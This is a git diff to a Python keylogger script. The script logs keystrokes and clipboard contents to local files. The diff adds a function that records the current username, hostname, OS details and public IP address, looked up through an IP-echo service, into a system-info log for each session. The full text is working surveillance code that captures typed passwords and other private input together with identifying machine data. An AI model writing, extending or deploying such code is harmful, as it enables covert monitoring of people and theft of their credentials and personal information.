@@ -1,11 +1,17 @@
+import getpass
+
 from pynput import keyboard
 import datetime
 import pyperclip
 import time
 import threading
+import socket
+import platform
+import requests
 
 logFile = "log.txt"
 clipboardLogFile = "clipboard.txt"
+sysInfoFile = "sysinfo.txt"
 
 # Dictionary of special keys that are converted to labels for easier readability in log file
 mappedKeys = {
@@ -60,11 +66,38 @@ def clipboard_monitoring():
         time.sleep(0.5) # Check every half second
 
 
+def get_system_info():
+    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    user = getpass.getuser()
+    hostname = socket.gethostname()
+    operating_system = platform.system()
+    version = platform.release()
+    architecture = platform.machine()
+
+    try:
+        public_ip = requests.get("https://api.ipify.org", timeout=6).text
+    except:
+        public_ip = "Cannot be found"
+
+    with open (sysInfoFile, "a") as file:
+        file.write(f"----- New Logging Session [{timestamp}] -----\n")
+        file.write(f"User: {user}\n")
+        file.write(f"Hostname: {hostname}\n")
+        file.write(f"Operating System: {operating_system}\n")
+        file.write(f"OS Version: {version}\n")
+        file.write(f"OS Architecture: {architecture}\n")
+        file.write(f"Public IP: {public_ip}\n")
+        file.write(f"\n")
+
+
+
 
 if __name__ == "__main__":
     print("Keylogger started, press ESC to exit")
 
     threading.Thread(target=clipboard_monitoring, daemon=True).start()
+
+    get_system_info()
 
     with keyboard.Listener(on_press=press, on_release=release) as listener:
         # listener remains running until release() returns False
